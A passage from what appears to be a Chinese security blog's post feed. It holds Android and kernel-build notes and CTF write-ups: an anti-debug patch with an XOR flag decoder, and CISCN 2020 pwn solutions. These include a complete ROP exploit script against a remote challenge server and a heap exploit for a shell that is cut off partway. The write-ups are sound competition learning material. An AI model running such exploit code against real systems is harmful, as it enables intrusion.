src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021191849.png" alt="20201021191849"></p><p>按<code>Alt + A</code> 修改为 <code>Unicode C-style(16 bits)</code> 得到中文 <code>你赢了</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021191959.png" alt="20201021191959"></p><p>找到函数<code>0x00B01BB0</code>, 猜测校验及加密如下</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021192141.png" alt="20201021192141"></p><p>其中byte_C777F8是生成出来的，可用动态调试得到，但是本题用了反调试，这里直接暴力绕过，即<code>jz =&gt; jmp</code>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">text:00B01BE8                 jmp     short loc_B01BF2 ; Keypatch modified this from:</span><br><span class="line">.text:00B01BE8                                         ;   jz short loc_E21BF2</span><br><span class="line">.text:00B01BEA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00B01BEA                 push    0               ; uExitCode</span><br><span class="line">.text:00B01BEC                 call    ds:ExitProcess</span><br><span class="line">.text:00B01BF2 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00B01BF2</span><br><span class="line">.text:00B01BF2 loc_B01BF2:                             ; CODE XREF: sub_B01BB0+38↑j</span><br></pre></td></tr></table></figure><p>则在调试过程中可得byte_C777F8，最终解密脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0x28</span>, <span class="number">0x57</span>, <span class="number">0x64</span>, <span class="number">0x6B</span>, <span class="number">0x93</span>, <span class="number">0x8F</span>, <span class="number">0x65</span>, <span class="number">0x51</span>, <span class="number">0xE3</span>, <span class="number">0x53</span>,</span><br><span class="line">     <span class="number">0xE4</span>, <span class="number">0x4E</span>, <span class="number">0x1A</span>, <span class="number">0xFF</span>]</span><br><span class="line">check_num = [<span class="number">0x1B</span>, <span class="number">0x1C</span>, <span class="number">0x17</span>, <span class="number">0x46</span>, <span class="number">0xF4</span>,</span><br><span class="line">             <span class="number">0xFD</span>, <span class="number">0x20</span>, <span class="number">0x30</span>, <span class="number">0xB7</span>, <span class="number">0x0C</span>, <span class="number">0x8E</span>, <span class="number">0x7E</span>, <span class="number">0x78</span>, <span class="number">0xDE</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    flag += <span class="built_in">bytes</span>([s[i] ^ check_num[i]])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到flag：<code>3Ks-grEaT_j0b!</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>make 工具降版本</title>
      <link href="/note-pwn-kernel-low-version-make/"/>
      <url>/note-pwn-kernel-low-version-make/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote><p>使用替换后make编译内核3.18.4时出现<code>segmentation fault</code>错误导致无法使用, 方案放弃</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为要编译低版本的内核, 但是高版本make在编译时会因为编译规则问题而报错，因此要考虑降低 make 版本</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><ol><li><p>下载 make 3.81</p><p> 在官网 <a href="https://ftp.gnu.org/gnu/make/">https://ftp.gnu.org/gnu/make/</a> 下载对应版本的 make, 如:</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://ftp.gnu.org/gnu/make/make-3.81.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>解压</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar xf make-3.81.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>执行 configuration</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/make-3.81</span><br></pre></td></tr></table></figure></li><li><p>执行build.sh</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh build.sh</span><br></pre></td></tr></table></figure></li><li><p>安装 make</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure></li><li><p>替换 make</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo cp make /usr/bin/make</span><br></pre></td></tr></table></figure></li><li><p>可以看到版本已经降下来了</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  make-3.81 make --version</span><br><span class="line">GNU Make 3.81</span><br><span class="line">Copyright (C) 2006  Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the <span class="built_in">source</span> <span class="keyword">for</span> copying conditions.</span><br><span class="line">There is NO warranty; not even <span class="keyword">for</span> MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line"></span><br><span class="line">This program built <span class="keyword">for</span> x86_64-unknown-linux-gnu</span><br></pre></td></tr></table></figure></li></ol><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li><p>在执行<code>sh build.sh</code>时, 遇到如下错误</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glob.o: In function `glob_in_dir&#x27;:</span><br><span class="line">/mnt/d/Users/Lantern/Desktop/work/kernal/make-3.81/./glob/glob.c:1336: undefined reference to `__alloca&#x27;</span><br><span class="line">/mnt/d/Users/Lantern/Desktop/work/kernal/make-3.81/./glob/glob.c:1250: undefined reference to `__alloca&#x27;</span><br><span class="line">/mnt/d/Users/Lantern/Desktop/work/kernal/make-3.81/./glob/glob.c:1277: undefined reference to `__alloca&#x27;</span><br><span class="line">/mnt/d/Users/Lantern/Desktop/work/kernal/make-3.81/./glob/glob.c:1361: undefined reference to `__alloca&#x27;</span><br><span class="line">glob.o: In function `glob&#x27;:</span><br><span class="line">/mnt/d/Users/Lantern/Desktop/work/kernal/make-3.81/./glob/glob.c:575: undefined reference to `__alloca&#x27;</span><br><span class="line">glob.o:/mnt/d/Users/Lantern/Desktop/work/kernal/make-3.81/./glob/glob.c:726: more undefined references to `__alloca&#x27; follow</span><br><span class="line">collect2: error: ld returned 1 exit status</span><br></pre></td></tr></table></figure><p> 在 <a href="https://stackoverflow.com/questions/51675200/install-older-version-of-gnu-make-in-ubuntu-18-04">https://stackoverflow.com/questions/51675200/install-older-version-of-gnu-make-in-ubuntu-18-04</a> 找到解决方法:</p><p> 将<code>glob.c</code>中的</p> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">if</span> _GNU_GLOB_INTERFACE_VERSION == GLOB_INTERFACE_VERSION</span></span><br></pre></td></tr></table></figure><p> 改为</p> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">if</span> _GNU_GLOB_INTERFACE_VERSION &gt;= GLOB_INTERFACE_VERSION</span></span><br></pre></td></tr></table></figure><p> 即可成功编译</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Android上安装busybox</title>
      <link href="/note-andorid-install-busybox/"/>
      <url>/note-andorid-install-busybox/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote><p>前提：手机已经root</p></blockquote><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>打开<a href="http://www.busybox.net/downloads/binaries">官网</a>，选择最新版本，然后下载对应设备的架构版本，我这里下载了<code>busybox-armv8l</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/12.png" alt="12"></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>然后修改文件名字为<code>busybox</code>并上传到手机上</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb push busybox /data/<span class="built_in">local</span>/tmp/</span><br></pre></td></tr></table></figure><p>切换为<code>root</code>权限并修改<code>busybox</code>执行权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su</span><br><span class="line"><span class="built_in">cd</span> /data/<span class="built_in">local</span>/tmp/</span><br><span class="line">chmod +x busybox</span><br></pre></td></tr></table></figure><p>移动至<code>/system/xbin</code>目录下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv ./busy /system/xbin</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./busybox --install /system/xbin</span><br></pre></td></tr></table></figure><p>就可以使用命令了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vince:/data/<span class="built_in">local</span>/tmp $ find -name busybox</span><br><span class="line">./busybox</span><br></pre></td></tr></table></figure><h2 id="对比ls指令"><a href="#对比ls指令" class="headerlink" title="对比ls指令"></a>对比ls指令</h2><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/13.png" alt="13.png"></p><p>高下立判</p><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><ul><li><p><code>android</code>系统本身就有<code>ls</code>命令，<code>busybox</code>里也有<code>ls</code>，输入ls时调用的是<code>android</code>的<code>ls</code>，那么想用<code>busybox</code>的<code>ls</code>就要每次都在前面加个<code>busybox</code>吗？不用，使用<code>alias</code>命令可以搞定。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> ls=<span class="string">&#x27;busybox ls&#x27;</span></span><br></pre></td></tr></table></figure><p>同样的，<code>cp</code>、<code>mv</code>等二者都有的命令都可以这样搞定。也可以通过修改 <code>/init.rc</code>来解决。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android SDK Tools Install</title>
      <link href="/note-andorid-sdk-tool/"/>
      <url>/note-andorid-sdk-tool/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考：<a href="https://www.cnblogs.com/nebie/p/9145627.html">Android SDK的下载和安装</a></p><h2 id="完整下载"><a href="#完整下载" class="headerlink" title="完整下载"></a>完整下载</h2><p>目前官网上已经没有单独的SDK下载安装包了。目前<a href="https://developer.android.com/studio/">官网</a>推荐的是下载包含有Android SDK的Android Studio， 当然我们也可以使用jetbrain的<a href="https://www.jetbrains.com/toolbox-app/">Tool Box</a>下载</p><p>如果你发现下载完整版以后没有<code>SDK Tools</code>可选，参考官网，<a href="https://developer.android.com/studio/releases/sdk-tools">https://developer.android.com/studio/releases/sdk-tools</a>，官方已停止更新</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/9.png" alt="9.png"></p><p>然而在command-line tools我也没有找到<code>uiautomatorviewer.bat</code></p><h2 id="单独下载"><a href="#单独下载" class="headerlink" title="单独下载"></a>单独下载</h2><p>如果你实在想单独下载<code>SDK Tools</code>和<code>Platfrom Tools</code>的话，可以直接在<a href="https://developer.android.com/studio/releases">官网</a>和<a href="https://www.androiddevtools.cn/">国内Android工具的下载网站</a>下载</p><h3 id="国内下载站"><a href="#国内下载站" class="headerlink" title="国内下载站"></a>国内下载站</h3><p>进入页面后点击【Android SDK 工具】按钮，然后在弹出的选择框内点击【SDK Tools】按钮，然后界面会自动跳转到SDK 的下载界面，选择适合自己的版本进行下载</p><p>而【SDK Platform-Tools】就在【SDK Tools】的下一块</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/2.png" alt="2"></p><h3 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h3><h4 id="platform-tools"><a href="#platform-tools" class="headerlink" title="platform tools"></a>platform tools</h4><p><a href="https://developer.android.com/studio/releases/platform-tools">https://developer.android.com/studio/releases/platform-tools</a></p><p>如果你使用的是中文文档，请转换为英文，否则你点击下载链接将无事发生（2020.4.28）</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/sdk-tool-platform.png" alt="sdk-tool-platform"></p><p>暂时找不到官方SDK Tools怎么下载….</p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UI Automator Viewer的使用</title>
      <link href="/note-andorid-ui-automator-viewer/"/>
      <url>/note-andorid-ui-automator-viewer/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h2><p><strong>uiautomatorviewer</strong>是 android SDK 自带的工具。通过截屏并分析 XML 布局文件的方式，为用户提供控件信息查看服务。该工具位于 SDK 目录下的 <code>tools\bin</code> 子目录下，通过bat文件启动的。</p><h2 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h2><p>整个界面分四个区域</p><ul><li><p>工作栏区（上）</p><p>共四个按钮，从左至右分别用于：打开已保存的布局，获取详细布局，获取简洁布局，保存布局。</p><ul><li>保存布局<code>Save</code>：将存储两个文件，一个是图片文件，一个是.uix文件（XML布局结构）</li><li>获取详细布局<code>Device Screenshoot (uiautomator dump)</code>: 将全部布局呈现出来</li><li>获取简洁布局<code>Device Screenshoot with Compressed Hierarchy (uiautomator dump –compressed)</code>: 只呈现有用的控件布局</li></ul></li><li><p>截图区（左），显示当前屏幕显示的布局图片</p></li><li><p>布局区（右上）,已XML树的形式，显示控件布局</p></li><li><p>控件属性区（右下），当点击某一控件时，将显示控件属性</p></li></ul><h2 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h2><p>第一次点击Device Screenshoot按钮时，将会报错，显示如下</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/3.png" alt="3.png"></p><p>原因是在于，<code>uiautomatorviewer.bat</code>中，需要知道 SDK 下的子目录 <code>platform-tools</code> 的路径，即 bat 文件中的<code>%prog_dir%</code>，因此我们需要修改 <code>uiautomatorviewer.bat</code> 中最后一行代码，将<code>%prog_dir%</code>替换为 <code>platform-tools</code> 的实际目录。</p><p>修改前:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">call <span class="string">&quot;%java_exe%&quot;</span> <span class="string">&quot;-Djava.ext.dirs=%javaextdirs%&quot;</span> <span class="string">&quot;-Dcom.android.uiautomator.bindir=%prog_dir%&quot;</span> -jar %jarpath% %*</span><br></pre></td></tr></table></figure><p>修改后:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">call <span class="string">&quot;%java_exe%&quot;</span> <span class="string">&quot;-Djava.ext.dirs=%javaextdirs%&quot;</span> <span class="string">&quot;-Dcom.android.uiautomator.bindir=C:\Users\XXXXX\AppData\Local\Android\Sdk\platform-tools&quot;</span> -jar %jarpath% %*</span><br></pre></td></tr></table></figure><p><code>p.s. XXXXX为用户名</code></p><h2 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h2><p>再次点击，出现如下错误</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/4.png" alt="4.png"></p><p>折腾了好久，最终在<a href="https://github.com/yaming116/uiautomatorview">https://github.com/yaming116/uiautomatorview</a>找到解决方法</p><p>我们直接下载<code>LvmamaXmlKit.jar</code>和<code>uiautomatorviewer.jar</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/5.png" alt="5.png"></p><p>将<code>uiautomatorviewer.jar</code>替换<code>\tools\lib\uiautomatorviewer.jar</code></p><p>如果带后缀如<code>xxx-25.3.1.jar</code>也要重命名带上后缀</p><p>由于 adb 截图使用的是<a href="https://testerhome.com/topics/12459">LvmamaXmlKit</a>,所以使用此功能需要把这个 LvmamaXmlKit.jar 导入到手机中，否则将报错，命令如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb push LvmamaXmlKit.jar /data/<span class="built_in">local</span>/tmp</span><br></pre></td></tr></table></figure><h2 id="成功捕获"><a href="#成功捕获" class="headerlink" title="成功捕获"></a>成功捕获</h2><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/6.png" alt="6.png"></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 编译内核问题汇总</title>
      <link href="/note-pwn-kernel-compilation-problem/"/>
      <url>/note-pwn-kernel-compilation-problem/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在内核编译时总会遇到一些奇奇怪怪的问题, 这里是对这些问题的解决的汇总</p><h2 id="gcc-版本问题"><a href="#gcc-版本问题" class="headerlink" title="gcc 版本问题"></a>gcc 版本问题</h2><p>高版本gcc编译低版本总会有一堆error, 可采用多版本gcc共存的方案, 详见<a href="https://lantern.cool/tool-linux-muti-gcc/">Linux环境多版本编译器(gcc)共存</a>, 再用低版本gcc进行编译即可</p><p>也可以用于解决编译时错误<code>fatal error: linux/compiler-gcc7.h: No such file or directory</code></p><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ol><li><p>编译遇到错误<code>.size expression for copy_user_generic_c does not evaluate to a constant</code>, 可修改<code>arch/x86_64/lib/copy_user.S</code>中的<code>END(copy_user_generic_c)</code> 更改为 <code>END(copy_user_generic_string)</code>, 目的是与上边的 <code>ENTRY(（)copy_user_generic_string)</code>保持相同变量, 解决方案来自<a href="https://stackoverflow.com/questions/23194840/linux-2-6-24-kernel-compilation-error-size-expression-for-copy-user-generic-c-d">https://stackoverflow.com/questions/23194840/linux-2-6-24-kernel-compilation-error-size-expression-for-copy-user-generic-c-d</a></p></li><li><p>编译遇到如下问题</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error:Makefile:416: *** mixed implicit and normal rules. stop</span><br><span class="line">error:Makefile:1449: *** mixed implicit and normal rules. stop</span><br></pre></td></tr></table></figure><p> 原因及解决方法：make版本过高, 需要修改错误信息中的Makefile指定416、1449行内容</p><ul><li>416：<code>config %config: scripts_basic outputmakefile FORCE</code> 改为：<code>%config: scripts_basic outputmakefile FORCE</code></li><li>1449：<code>/ %/: prepare scripts FORCE</code> 改为：<code>%/: prepare scripts FORCE​​​​​​​</code></li></ul></li><li><p>编译遇到如下错误</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kernel/built-in.o: In function `mutex_lock&#x27;:</span><br><span class="line"> (.sched.text+0x11cf): undefined reference to `__mutex_lock_slowpath&#x27;</span><br><span class="line"> kernel/built-in.o: In function `mutex_unlock&#x27;:</span><br><span class="line"> (.sched.text+0x11de): undefined reference to `__mutex_unlock_slowpath&#x27;</span><br><span class="line"> Makefile:715: recipe for target &#x27;.tmp_vmlinux1&#x27; failed</span><br><span class="line"> make: *** [.tmp_vmlinux1] Error 1</span><br></pre></td></tr></table></figure><p>解决方案: 在<code>kernel/mutex.c</code>文件中对四个位置进行修改,<br>将三处<code>static void fastcall noinline __sched</code>修改为<code>static __attribute__ ((used)) void fastcall noinline __sched</code></p><p>将<code>static fastcall noinline void</code>改为<code>static __attribute__ ((used)) void fastcall noinline __sched</code></p></li><li><p>如果出现以下信息导致编译错误，可能是由于 make 版本过高的缘故，如果你是用 Ubuntu18 进行编译，不妨试试 Ubuntu16 或降低 make 版本, <a href="https://lantern.cool/note-pwn-kernel-low-version-make">make 工具降版本</a></p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make[2]: *** No rule to make target <span class="string">&#x27;net/netfilter/xt_TCPMSS.o&#x27;</span>, needed by <span class="string">&#x27;net/netfilter/built-in.o&#x27;</span>.  Stop.</span><br><span class="line">scripts/Makefile.build:573: recipe <span class="keyword">for</span> target <span class="string">&#x27;net/netfilter&#x27;</span> failed</span><br><span class="line">make[1]: *** [net/netfilter] Error 2</span><br><span class="line">make[1]: *** Waiting <span class="keyword">for</span> unfinished <span class="built_in">jobs</span>....</span><br></pre></td></tr></table></figure></li><li><p>如果出现以下信息到启动错误，是因为 <code>vmlinux</code> 是 ELF 文件格式，这时用 <code>bzImage</code> 启动虚拟机就可以了</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu: linux kernel too old to load a ram disk</span><br></pre></td></tr></table></figure></li><li><p>如果编译内核时出现 <code>cc1: error: code model kernel does not support PIC mode</code> 错误</p><p> 查找 <code>Makefile</code> 文件中的 <code>KBUILD_CFLAGS</code>, 在尾部添加 <code>-fno-pie</code> 即可，以 linux-4.7 版本源码 Makefile 为例，如图</p><p> <img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20200821185911.png" alt="20200821185911"></p></li><li><p>如果编译内核时出现错误<code>make[2]: *** No rule to make target &#39;net/netfilter/xt_TCPMSS.o&#39;, needed by &#39;net/netfilter/built-in.o&#39;.  Stop</code>, 原因可能是你所用的文件系统不区分大小写, 在 <code>net/netfilter</code> 文件夹下应该有两个文件<code>xt_TCPMSS.c</code> 与 <code>xt_tcpmss.c</code>, 但你会发现实际上只有<code>xt_tcpmss.c</code>, 就是不区分大小写所致</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN 初赛</title>
      <link href="/wp-games-2020ciscn-pre/"/>
      <url>/wp-games-2020ciscn-pre/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>菜鸡又是只会签到, pwn基本都是nuoye大哥做的, 这是他的blog: <a href="https://nuoye-blog.github.io/2020/08/21/37439286/">2020CISCN-线上初赛</a></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="wow"><a href="#wow" class="headerlink" title="wow"></a>wow</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>与2020 RCTF的bf类似，缓冲区紧接着的指令指针存在off by one，可以控制该指针在栈上任意输入。</p><p>劫持返回地址构造rop，并将指令指针还原回去（存在check）。</p><p>因为禁用了execute系统调用，所以需要通过ORW方式获取flag。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./wow&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;101.200.53.148&quot;</span>,<span class="string">&quot;15324&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x00000000004047ba</span></span><br><span class="line">pop_rsi=<span class="number">0x0000000000407578</span></span><br><span class="line">pop_rdx=<span class="number">0x000000000040437f</span></span><br><span class="line">pop_rbp=<span class="number">0x0000000000404c41</span></span><br><span class="line">pop_rax_rdx_rbx=<span class="number">0x000000000053048a</span></span><br><span class="line">mov_rdi_rax = <span class="number">0x000000000041768f</span></span><br><span class="line">syscall = <span class="number">0x00000000004dc054</span></span><br><span class="line">read = <span class="number">0x52A670</span></span><br><span class="line">bss = <span class="number">0x5d3520</span></span><br><span class="line">puts = <span class="number">0x4D47B4</span></span><br><span class="line"></span><br><span class="line">rop = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">rop += p64(pop_rdi)</span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(pop_rax_rdx_rbx)</span><br><span class="line">rop += <span class="string">&#x27;/flag&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span></span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(mov_rdi_rax)</span><br><span class="line">rop += p64(pop_rax_rdx_rbx)</span><br><span class="line">rop += p64(<span class="number">0x2</span>)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(pop_rsi)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(syscall)<span class="comment">#open</span></span><br><span class="line">rop += p64(pop_rdi)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi)</span><br><span class="line">rop += p64(bss+<span class="number">0x100</span>)</span><br><span class="line">rop += p64(pop_rax_rdx_rbx)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(syscall)<span class="comment">#read</span></span><br><span class="line">rop += p64(pop_rdi)</span><br><span class="line">rop += p64(bss+<span class="number">0x100</span>)</span><br><span class="line">rop += p64(puts)<span class="comment">#puts</span></span><br><span class="line">rop += <span class="string">&quot;^&#123;@^&#125;$&quot;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;enter your code:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;^&#123;@^&#125;&amp;&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;running....\n&quot;</span>)</span><br><span class="line">byte = u32(p.recv(<span class="number">1</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>) -<span class="number">1</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;continue?&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;enter your code:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;^&#123;@^&#125;$&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;running....\n&quot;</span>)</span><br><span class="line">p.send(p64(byte+<span class="number">0x48</span>)[<span class="number">0</span>])</span><br><span class="line">p.recvuntil(<span class="string">&quot;continue?&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;enter your code:&quot;</span>)</span><br><span class="line">p.send(rop+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;running....\n&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x00000000004dc054&#x27;)</span></span><br><span class="line">p.send(p64(byte)[<span class="number">0</span>])</span><br><span class="line">p.recvuntil(<span class="string">&quot;continue?&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>存在off by one漏洞，利用漏洞可以实现chunk extend，得到两个指向同一地址的指针。然后利用堆错位来伪造size位等，实现将同一个地址先后free进fastbin和unsortbin，进而利用main_arean劫持stdout结构(1/16概率)，使用io_leak的方法获取到libc地址。</p><p>接着用fastbin的double free漏洞劫持__malloc_hook，从而getshell。</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">    p = remote(<span class="string">&quot;101.200.53.148&quot;</span>,<span class="string">&quot;34521&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./pwn&quot;</span>).libc</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">        p.sendline(<span 